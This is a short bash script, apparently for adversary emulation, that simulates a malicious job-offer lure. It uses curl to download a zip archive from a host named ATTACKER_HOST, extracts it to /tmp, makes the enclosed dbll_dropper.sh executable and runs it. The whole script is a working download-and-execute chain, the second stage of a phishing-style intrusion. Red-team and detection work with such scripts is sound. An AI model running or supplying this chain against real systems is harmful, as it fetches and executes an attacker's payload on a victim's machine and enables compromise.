#!/bin/bash

ATTACKER_HOST="10.0.0.1"  
ARCHIVE_URL="http://$ATTACKER_HOST:8000/job_offer.zip"
DOWNLOAD_PATH="/tmp/job_offer.zip"
EXTRACT_DIR="/tmp/job_offer_files"

echo "[*] Starting JobOffer macro simulation..."

curl -s -o $DOWNLOAD_PATH $ARCHIVE_URL
if [ $? -ne 0 ]; then
    echo "[!] Failed to download payload archive."
    exit 1
fi
echo "[*] Payload archive downloaded to $DOWNLOAD_PATH"

rm -rf $EXTRACT_DIR
mkdir -p $EXTRACT_DIR

unzip -q $DOWNLOAD_PATH -d $EXTRACT_DIR
if [ $? -ne 0 ]; then
    echo "[!] Failed to unzip payload archive."
    exit 1
fi
echo "[*] Payload archive extracted to $EXTRACT_DIR"

echo "[*] Extracted files:"
ls -l $EXTRACT_DIR

chmod +x $EXTRACT_DIR/dbll_dropper.sh
$EXTRACT_DIR/dbll_dropper.sh

echo "[*] JobOffer script complete. Dropper executed."

